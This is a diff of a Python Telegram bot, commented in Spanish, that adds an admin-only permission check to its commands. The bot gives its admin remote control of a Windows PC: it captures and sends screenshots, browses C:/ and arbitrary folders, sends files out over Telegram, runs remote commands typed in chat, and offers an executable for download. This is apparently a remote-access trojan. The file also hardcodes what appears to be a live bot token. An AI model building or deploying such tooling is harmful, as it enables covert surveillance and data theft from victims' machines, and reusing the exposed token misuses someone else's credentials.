@@ -9,6 +9,9 @@ from datetime import datetime
 TOKEN = '7350752233:AAFZTB3HMBbzbFMHh0-7q3XDbKnDb-ExWLg'
 bot = telebot.TeleBot(TOKEN)
 
+# ID del usuario admin
+ADMIN_ID = 5433151369
+
 # Ruta para guardar capturas de pantalla (ruta relativa)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CAPTURES_DIR = os.path.join(BASE_DIR, 'Assets', 'Captures')
@@ -36,8 +39,16 @@ BASE_DIR = 'C:/'
 # Diccionario para almacenar la última carpeta listada por cada usuario
 user_directories = {}
 
-# Función para crear el menú de botones
-def get_main_menu():
+# Función para crear el menú de botones para usuarios normales
+def get_normal_menu():
+    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
+    btn_help = types.KeyboardButton('/help')
+    btn_user_info = types.KeyboardButton('/user_info')
+    markup.add(btn_help, btn_user_info)
+    return markup
+
+# Función para crear el menú de botones para usuarios admin
+def get_admin_menu():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     btn_help = types.KeyboardButton('/help')
     btn_screenshot = types.KeyboardButton('/screenshot')
@@ -50,15 +61,30 @@ def get_main_menu():
 
 # Función para enviar instrucciones y mostrar botones
 def send_instructions(chat_id):
-    markup = get_main_menu()
-    welcome_message = ("Hola! Soy tu bot. Puedes interactuar conmigo usando los siguientes comandos:\n"
-                       "/help - Muestra este mensaje de ayuda\n"
-                       "/screenshot - Toma y envía una captura de pantalla\n"
-                       "/list_files - Lista los directorios en la raíz del disco C\n"
-                       "/list_directory - Lista el contenido de una carpeta específica\n"
-                       "/remote_command - Ejecuta un comando remoto\n"
-                       "/download - Descarga el ejecutable")
+    if is_admin(chat_id):
+        markup = get_admin_menu()
+    else:
+        markup = get_normal_menu()
+    
+    if is_admin(chat_id):
+        welcome_message = ("Hola Admin! Puedes interactuar conmigo usando los siguientes comandos:\n"
+                           "/help - Muestra este mensaje de ayuda\n"
+                           "/screenshot - Toma y envía una captura de pantalla\n"
+                           "/list_files - Lista los directorios en la raíz del disco C\n"
+                           "/list_directory - Lista el contenido de una carpeta específica\n"
+                           "/remote_command - Ejecuta un comando remoto\n"
+                           "/download - Descarga el ejecutable")
+    else:
+        user_name = bot.get_chat_member(chat_id, chat_id).user.first_name
+        welcome_message = (f"Hola {user_name}! Puedes interactuar conmigo usando los siguientes comandos:\n"
+                           "/help - Muestra este mensaje de ayuda\n"
+                           "/user_info - Muestra tu información de usuario")
+    
     bot.send_message(chat_id, welcome_message, reply_markup=markup)
+
+# Verificar si el usuario es admin
+def is_admin(user_id):
+    return user_id == ADMIN_ID
 
 @bot.message_handler(commands=['save'])
 def save_user(message):
@@ -70,7 +96,11 @@ def save_user(message):
 # Comando /help para proporcionar ayuda
 @bot.message_handler(commands=['help'])
 def send_help(message):
-    markup = get_main_menu()
+    if is_admin(message.from_user.id):
+        markup = get_admin_menu()
+    else:
+        markup = get_normal_menu()
+        
     help_message = ('Puedes interactuar conmigo usando los siguientes comandos:\n'
                     '/start - Inicia el bot y muestra el menú\n'
                     '/help - Muestra este mensaje de ayuda\n'
@@ -82,10 +112,21 @@ def send_help(message):
                     '/download - Descarga el ejecutable')
     bot.send_message(message.chat.id, help_message, reply_markup=markup)
 
+# Comando /user_info para mostrar la información del usuario
+@bot.message_handler(commands=['user_info'])
+def user_info(message):
+    user_name = message.from_user.first_name
+    markup = get_normal_menu()
+    bot.send_message(message.chat.id, f"Hola {user_name}! Este es tu perfil.", reply_markup=markup)
+
 # Comando /screenshot para capturar y enviar una captura de pantalla
 @bot.message_handler(commands=['screenshot'])
 def send_screenshot(message):
-    markup = get_main_menu()
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
+        return
+    
+    markup = get_admin_menu()
     try:
         screenshot = pyautogui.screenshot()
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -99,7 +140,11 @@ def send_screenshot(message):
 # Comando /list_files para listar los directorios en la raíz del disco C
 @bot.message_handler(commands=['list_files'])
 def list_files(message):
-    markup = get_main_menu()
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
+        return
+
+    markup = get_admin_menu()
     try:
         root_dir = 'C:/'
         directories = [d for d in os.listdir(root_dir) if os.path.isdir(os.path.join(root_dir, d))]
@@ -114,12 +159,16 @@ def list_files(message):
 # Comando /list_directory para listar el contenido de una carpeta específica
 @bot.message_handler(commands=['list_directory'])
 def request_directory(message):
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
+        return
+
     user_directories[message.chat.id] = BASE_DIR
     msg = bot.send_message(message.chat.id, f'Estás en {BASE_DIR}. Ingresa el nombre de la carpeta para listar su contenido:')
     bot.register_next_step_handler(msg, list_directory)
 
 def list_directory(message):
-    markup = get_main_menu()
+    markup = get_admin_menu()
     current_path = user_directories.get(message.chat.id, BASE_DIR)
     folder_name = message.text.strip()
     new_path = os.path.join(current_path, folder_name)
@@ -158,7 +207,7 @@ def handle_next_step(message):
         list_directory(message)
 
 def send_specific_file(message, file_path):
-    markup = get_main_menu()
+    markup = get_admin_menu()
     if os.path.exists(file_path):
         try:
             with open(file_path, 'rb') as file:
@@ -173,12 +222,12 @@ def send_specific_file(message, file_path):
 # Comando /remote_command para ejecutar comandos remotos
 @bot.message_handler(commands=['remote_command'])
 def request_command(message):
-    user_id = message.from_user.id
-    if user_id == 5433151369:
-        msg = bot.send_message(message.chat.id, 'Por favor, ingresa el comando que deseas ejecutar:')
-        bot.register_next_step_handler(msg, execute_remote_command)
-    else:
-        bot.send_message(message.chat.id, 'No tienes permisos para ejecutar comandos remotos.')
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
+        return
+
+    msg = bot.send_message(message.chat.id, 'Por favor, ingresa el comando que deseas ejecutar:')
+    bot.register_next_step_handler(msg, execute_remote_command)
 
 def execute_remote_command(message):
     command = message.text.strip()
@@ -194,7 +243,11 @@ def execute_remote_command(message):
 # Comando /download para descargar el ejecutable
 @bot.message_handler(commands=['download'])
 def download_executable(message):
-    markup = get_main_menu()
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
+        return
+
+    markup = get_admin_menu()
     telegram_id = message.from_user.id
     name = message.from_user.first_name
 
@@ -213,4 +266,3 @@ def handle_all_messages(message):
 
 def run_bot():
     bot.polling(none_stop=True)
-
